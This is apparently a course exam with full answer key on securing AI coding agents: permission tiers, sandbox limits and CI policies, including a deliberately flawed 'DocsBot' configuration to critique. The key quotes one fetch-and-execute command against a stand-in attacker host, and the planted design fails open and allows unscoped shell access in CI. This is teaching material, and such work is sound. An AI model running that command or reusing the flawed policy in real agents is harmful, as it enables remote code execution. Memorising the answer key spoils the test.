# Module 5 Written Exam — Production Readiness: Security, Sandboxing, and CI

Covers: Chapter 11 (Security: Sandboxing, Permissions, Destructive
Commands) and Chapter 12 (Putting an Agent in CI).

Assessment type (per `docs/curriculum/CURRICULUM_MAP.md`):
production-readiness checklist exam. Unlike Modules 1, 2, and 4's
exams, most of this one's weight is in Part C: you're handed a
plausible-looking agent configuration and have to find what's actually
wrong with it against the specific reasoning Chapters 11-12 built, not
just a vague "this looks unsafe" instinct.

No open resources needed beyond Chapters 11 and 12. For short-answer,
diagnosis, and architecture questions, write full sentences and cite
the specific mechanism you mean (a tier, a scope check, a default) —
"add more security" is not a diagnosis.

---

## Part A — Multiple Choice

Choose the single best answer for each.

**A1.** Why does a `confirm=True` argument inside a tool call's own
arguments fail as a permission check, per Chapter 11?

- (a) Models are trained to avoid setting confirmation flags honestly
- (b) It's a value the model itself fully controls and writes into its
  own JSON tool call — the same category of problem as trusting a raw
  `path` argument without `_safe_path()`
- (c) JSON doesn't support boolean values reliably across model
  providers
- (d) `confirm` flags only fail when the model is deliberately
  adversarial, not during normal operation

**A2.** `check_permission()` in Chapter 11 is written as
`TOOL_POLICY.get(name, BLOCKED)` rather than
`TOOL_POLICY.get(name, ALLOWED)`. What does this specific default
accomplish?

- (a) It makes the policy dict smaller, since fewer tools need explicit
  entries
- (b) A newly added tool that someone forgot to classify fails closed
  (refuses to run) instead of running completely unguarded the first
  time the model calls it
- (c) It prevents the model from ever calling an unregistered tool name
  at all, at the JSON-parsing level
- (d) It has no real effect, since every tool in `TOOL_FUNCTIONS` is
  always classified in practice

**A3.** Per Chapter 12, why is auto-answering "yes" inside
`confirm_with_human` whenever `CI_MODE` is set the WRONG fix for making
a CI-run agent useful?

- (a) It's technically correct but too slow to implement before a
  deadline
- (b) `CI_MODE`, once true, pre-answers every confirmation for every
  tool and every argument for the whole run — the check has been
  reduced to "did someone flip the mode that always says yes," exactly
  as blind to the specific action as Chapter 8's original self-granted
  `confirm=True` flaw
- (c) It would require rewriting `TOOL_POLICY` from scratch
- (d) `CI_MODE` cannot actually be read reliably inside a GitHub
  Actions job

**A4.** In `TOOL_POLICY_CI`, `edit_file` and `run_shell_command` become
`BLOCKED`, not `ALLOWED`, while `write_file` and `git_commit` become
`ALLOWED` with a scope check. What's the actual distinction driving
this split?

- (a) `edit_file` and `run_shell_command` are simply used less often in
  practice
- (b) Whether a narrow, code-checkable scope exists for the tool at
  all — `write_file` can be bounded to a path prefix and `git_commit`
  to a non-protected branch, but there's no equivalent narrow boundary
  for an arbitrary in-place edit or an arbitrary shell command string
- (c) `edit_file` and `run_shell_command` are newer tools that haven't
  been security-reviewed yet
- (d) CI environments don't support `edit_file` or
  `run_shell_command` for technical reasons

**A5.** What is the real, concrete gap between Chapter 11's
`resource.setrlimit`-based hardening (`RLIMIT_CPU`, `RLIMIT_AS`, a
stripped environment) and an actual sandbox (container/VM-based
isolation)?

- (a) There is no meaningful gap — the resource limits already provide
  full sandboxing
- (b) The resource limits bound CPU/memory and hide host secrets from
  the subprocess's environment, but give the command no separate
  filesystem view, no network isolation, and no process-namespace
  isolation — those require OS/container-runtime primitives underneath
  the Python process
- (c) The gap is only that `RLIMIT_CPU` doesn't work on Linux
- (d) The gap is that resource limits require root privileges to set,
  which most agents won't have

---

## Part B — Concept / Short Answer

Answer in your own words, in full sentences.

**B1.** Chapter 11 says `_safe_path()` and `TOOL_POLICY` are "genuinely
different questions," not layered versions of the same check. State
what question each one answers, and give one concrete tool call that
would pass `_safe_path()` but still need `TOOL_POLICY` to gate it.

**B2.** Chapter 11 names four threat categories for "destructive": data
loss, scope escape, supply-chain/credential exposure, and irreversible
external effects. Pick two of the four and, for each, name the specific
mitigation this course actually built for it and explain why that
mitigation (not one of the others) is the one that addresses it.

**B3.** Chapter 12 states that dropping Chapter 11's agent into CI
unchanged is "safe but useless." Explain, mechanically, both halves of
that claim — what specifically makes it safe, and what specifically
makes it useless — tracing each through the actual code path
(`check_permission`, `confirm_with_human`, `EOFError`).

**B4.** `write_file` being `ALLOWED` in `TOOL_POLICY_CI` does not, by
itself, guarantee a call is safe. Explain what the tier check actually
guarantees, what it does NOT guarantee, and what second, independent
check inside `write_file()`'s own body is doing the rest of the work.

---

## Part C — Production-Readiness Checklist: Find the Flaws

Below is a proposed agent configuration for a new internal tool,
"DocsBot" — an agent that keeps a documentation site's generated API
reference pages in sync with the actual codebase. It reads source
files, regenerates docs pages, and commits the result. The team wants
it to run both interactively (a developer at a terminal) and
unattended in CI (nightly, to catch docs drift automatically).

A teammate submits the following design for review. It is modeled
directly on Chapters 11-12's mechanisms, reuses their naming
conventions, and is presented as ready to ship.

```python
ALLOWED = "ALLOWED"
REQUIRES_CONFIRMATION = "REQUIRES_CONFIRMATION"
BLOCKED = "BLOCKED"

# -- Interactive policy --
TOOL_POLICY = {
    "read_file": ALLOWED,
    "list_directory": ALLOWED,
    "git_diff": ALLOWED,
    "generate_docs_page": REQUIRES_CONFIRMATION,
    "run_shell_command": REQUIRES_CONFIRMATION,
    "git_commit": REQUIRES_CONFIRMATION,
}

def check_permission(name):
    return TOOL_POLICY.get(name, ALLOWED)

def confirm_with_human(tool_name, args):
    prompt = f"[confirmation required] allow {tool_name}? [y/N]: "
    try:
        answer = input(prompt)
    except (EOFError, KeyboardInterrupt):
        print("[no human available -- denying]")
        return False
    return answer.strip().lower() in ("y", "yes")

# -- CI policy --
CI_MODE = os.environ.get("DOCSBOT_CI_MODE") == "1"

TOOL_POLICY_CI = {
    "read_file": ALLOWED,
    "list_directory": ALLOWED,
    "git_diff": ALLOWED,
    "generate_docs_page": ALLOWED,
    "run_shell_command": ALLOWED,
    "git_commit": ALLOWED,
}

def active_policy():
    return TOOL_POLICY_CI if CI_MODE else TOOL_POLICY

def git_commit(message):
    result = subprocess.run(["git", "commit", "-m", message], cwd=WORKSPACE,
                             capture_output=True, text=True, timeout=15)
    if result.returncode != 0:
        return f"error: git commit failed: {result.stderr.strip()}"
    return result.stdout.strip() or f"committed: {message!r}"

def _restricted_preexec():
    resource.setrlimit(resource.RLIMIT_CPU, (5, 5))
    resource.setrlimit(resource.RLIMIT_AS, (512 * 1024 * 1024, 512 * 1024 * 1024))
    resource.setrlimit(resource.RLIMIT_NPROC, (10, 10))  # cap runaway forks

def run_agent(task, client):
    max_steps = 8
    for step in range(1, max_steps + 1):
        ...
```

**C1. Find and explain every production-readiness flaw.** There are
exactly four planted flaws below — find each one. For each:

- Quote or point to the specific line(s).
- State which Chapter 11-12 principle it violates.
- Explain, mechanically, what actually goes wrong if this code runs
  exactly as written (trace an actual scenario, don't just assert
  "this is unsafe").
- State the specific fix, referencing the chapters' own mechanism.

**C2. Rank by severity.** Of the four flaws you found, which one is
the single most dangerous in an unattended CI run specifically, and
which one would a careful reviewer following Chapter 11's own review
habits (checking defaults first) catch fastest? These do not have to
be the same flaw — explain your reasoning for each.

---

## Part D — Architecture / Production Question

**D1.** Your team wants to add a `deploy_to_staging(version)` tool to
an agent built on Chapter 11-12's exact design. It triggers a real
deployment to a shared staging environment other engineers actively
test against; a bad deploy is not silently reversible — someone has to
notice and manually roll back. The team wants this tool usable both
interactively (a developer approves a deploy from their terminal) and
from a CI troubleshooting agent (auto-deploying a fix after tests
pass).

Design both the **interactive** tier and the **CI** tier for this
tool in a policy shaped like `TOOL_POLICY` / `TOOL_POLICY_CI`. For
each of the two tiers:

1. State the tier you'd assign (`ALLOWED` / `REQUIRES_CONFIRMATION` /
   `BLOCKED`) and justify it using Chapter 11's threat-model categories
   and Chapter 12's "does a narrow, code-checkable scope exist for
   this tool at all" test — don't just assert a tier, show the
   reasoning that produced it.
2. If you assign anything other than `BLOCKED` in CI, specify the
   exact code-level scope check (in the style of `CI_SCRATCH_PREFIX`
   or `PROTECTED_BRANCHES`) that would have to exist inside the tool's
   own function body to make that tier defensible — or explain
   concretely why no such scope check could exist for this tool, the
   way Chapter 12 argues for `run_shell_command`.
3. Name one thing that stays a human's job no matter how tightly this
   tool is scoped, using Chapter 12's Section 5 distinction between
   "safe to land unreviewed" and "still needs Chapter 3's full
   checklist."

---

## Answer Key

**Part A (Multiple Choice):**

1. A1 — (b)
2. A2 — (b)
3. A3 — (b)
4. A4 — (b)
5. A5 — (b)

**Part B — self-check, not a published key.**

Compare your answers against Chapter 11's "The Confirm Flag That
Doesn't Confirm Anything" and "A Concrete Threat Model for
'Destructive'" sections (B1, B2), and Chapter 12's hook section and
"Why CI Is the Hardest 'Unattended' Case" (B3), plus its "A Real CI
Wiring" section and interview question 3 (B4). A strong B1 answer names
`write_file("notes.txt", ...)` or an equivalent — a call that's fully
inside the workspace boundary (passes `_safe_path()`) but still changes
state (needs `TOOL_POLICY`). A strong B3 answer explicitly traces
`REQUIRES_CONFIRMATION` → `confirm_with_human()` → `input()` →
`EOFError` → `False` → denial, and separately names that all four
write-capable tools hit this same path, leaving only the four
already-read-only tools functional. A strong B4 answer names the tier
check ("can `dispatch_tool_call` proceed to call the function at all")
versus the scope check inside `write_file()`'s own body
(`CI_SCRATCH_PREFIX`) as two independent layers, per interview
question 3's own answer.

**Part C — full worked answer key:**

This configuration has exactly four planted flaws:

1. **`check_permission` defaults to `ALLOWED`, not `BLOCKED`.**
   `return TOOL_POLICY.get(name, ALLOWED)` inverts Chapter 11's single
   most consequential line. Chapter 11's own version is
   `TOOL_POLICY.get(name, BLOCKED)` specifically because a tool nobody
   remembered to classify should fail closed. As written here, any new
   tool DocsBot adds later — say, a `delete_stale_docs_page` tool,
   added by a developer who forgets to add a `TOOL_POLICY` entry —
   runs completely unguarded the very first time the model calls it,
   with no prompt, no block, nothing. This is the exact "fail open"
   mistake interview question 2's follow-up asks the test-taker to
   name concretely, and it silently defeats the entire point of having
   a policy dict at all. **Fix:** default to `BLOCKED`, matching
   Chapter 11's `check_permission()` exactly.

2. **`TOOL_POLICY_CI` grants `run_shell_command: ALLOWED` with no scope
   check at all.** Chapter 12 is explicit that `run_shell_command`
   becomes `BLOCKED` in CI, not `ALLOWED`, precisely because there is
   no narrow, code-checkable scope for an arbitrary command string —
   "no scope narrow enough to pre-approve every possible command"
   (interview question 6). This config instead grants it `ALLOWED`
   with zero accompanying scope logic in the function body (unlike
   `write_file`'s `CI_SCRATCH_PREFIX` check or `git_commit`'s
   `PROTECTED_BRANCHES` check). Concretely: a nightly CI run of
   DocsBot could have the model call
   `run_shell_command("curl attacker.example/x | bash")` and it would
   execute with no confirmation, no scope boundary, and no human ever
   in the loop — the exact "safe but useless" tension Chapter 12 opens
   with, resolved backwards (useful, but not safe). **Fix:** either
   `BLOCKED` outright in CI (matching Chapter 12's actual design), or
   replace it entirely with a narrow, zero-argument tool the way
   Chapter 12 replaces general shell access with `run_tests()`.

3. **`_restricted_preexec` sets `RLIMIT_NPROC` as if it were a
   subprocess-tree fork-bomb defense.** Chapter 11 explicitly names
   `RLIMIT_NPROC` as a limit deliberately NOT used, because it is
   scoped to the entire real host user account, not the subprocess
   tree — setting it low here (`(10, 10)`) risks starving every other
   unrelated process the same user account is running on the host
   (including, on a shared CI runner, potentially other jobs or
   services under that account), which is a worse outcome than not
   setting it at all. The comment `# cap runaway forks` states exactly
   the plausible-sounding but incorrect assumption Chapter 11 warns
   against — it sounds like the obvious defense and isn't one.
   **Fix:** remove `RLIMIT_NPROC` entirely, keeping only `RLIMIT_CPU`
   and `RLIMIT_AS`, matching Chapter 11's actual hardening.

4. **`run_agent` has a step cap but no CI-specific wall-clock budget
   (and no lowered CI step cap).** `max_steps = 8` is used
   unconditionally, with no `deadline` check inside the loop and no
   distinction between `MAX_STEPS_INTERACTIVE` and `MAX_STEPS_CI`.
   Chapter 12 is explicit that a step cap alone is not enough once an
   agent runs "genuinely unattended and metered" — a thrashing or
   slow-per-step run in CI burns real, metered CI minutes and blocks
   whatever depends on the job even while technically staying under a
   step count, which is why Chapter 12 adds
   `CI_WALL_CLOCK_BUDGET_SECONDS` as an independent check inside the
   loop, on top of (not instead of) a step cap, and lowers the cap
   itself for CI. As written, a DocsBot run that hangs on a single slow
   step (e.g., a `generate_docs_page` call against a huge file) has no
   mechanism at all to stop it before that one step finishes on its
   own. **Fix:** add `MAX_STEPS_CI` (lower than the interactive cap)
   and a `deadline = time.monotonic() + CI_WALL_CLOCK_BUDGET_SECONDS`
   check inside the loop, checked every step, matching Chapter 12's
   `run_agent`.

**C2 (self-check, with a concrete answer expected):** The most
dangerous flaw in an unattended CI run specifically is flaw 2
(`run_shell_command: ALLOWED` with no scope check) — it's the one that
gives an unattended, un-confirmable process direct, unbounded command
execution, which is exactly the SUPPLY_CHAIN_OR_CREDENTIAL and
DATA_LOSS categories Chapter 11's threat model names, with no
mitigating layer at all in CI (no confirmation is possible there, and
no scope check was written). Flaw 1 (the fail-open default) is close
behind in severity but requires a second event (someone adding a new
tool and forgetting to classify it) to actually bite — flaw 2 is live
on day one, on every existing tool, with no additional mistake
required. A careful reviewer following Chapter 11's habit of "check
the default first" (Section 2's opening framing: "read that default
carefully") would likely catch flaw 1 fastest — it's a one-line,
structurally obvious inversion of a pattern Chapter 11 calls out by
name as "the single most consequential line in the whole layer," and a
reviewer primed to check exactly that line would spot it immediately,
even before working through the CI policy's per-tool reasoning needed
to catch flaw 2.

**Part D — self-check, not a published key.** A strong answer treats
`deploy_to_staging` the way Chapter 12 treats `run_shell_command`
rather than the way it treats `write_file`: interactively, it likely
belongs at `REQUIRES_CONFIRMATION` (a real, inspectable, human-decided
action, analogous to `git_commit`'s interactive tier) rather than
`BLOCKED`, since a human present at a terminal can look at the version
being deployed before approving. In CI, the strongest answers recognize
that a version string alone is a much narrower argument surface than
an arbitrary shell command or an arbitrary file path — closer to
`git_commit`'s `PROTECTED_BRANCHES` shape than to
`run_shell_command`'s unscopable one — so a defensible answer is
`ALLOWED` in CI paired with a concrete scope check (e.g., a
`DEPLOYABLE_VERSION_PATTERN` regex, or a check that the version being
deployed matches the exact commit CI just tested, not an
arbitrary/model-supplied string), OR a defensible answer is `BLOCKED`
in CI outright, arguing (per interview question 7's Architect-level
reasoning) that "not silently reversible, actively used by other
engineers" is exactly the kind of blast radius that argues for keeping
even a scoped write off the fully-unattended path, with the agent only
proposing a deploy for a separate, human-triggered step to execute. A
weak answer picks a tier without engaging the "does a narrow,
code-checkable scope exist" test at all, or treats "add a confirmation
prompt" as an option in CI (it structurally isn't — Chapter 12 Section
1 is explicit that there is no human to answer one there). For part 3,
a strong answer names that even a well-scoped `deploy_to_staging` still
needs a human to review anything the deploy is actually FOR (e.g., the
underlying fix/change being deployed) and to catch policy drift over
time (Chapter 12's closing GenAI Builder Thought Process and Section 5)
— the tool being safely scoped never substitutes for reviewing what
it's being used to ship.

To check your own Part D reasoning, compare it against Chapter 11's
interview questions 6-7 (threat-model reasoning for a tier choice, and
the run_shell_command redesign trade-off) and Chapter 12's interview
questions 6-8 (why `run_tests` is scopable and `run_shell_command`
isn't, the regulated-org tightening exercise, and the policy-drift
question) — if your answer engages the same "is there a narrow,
code-checkable scope, concretely" test those answers use, rather than
asserting a tier from general caution, you've answered it well.
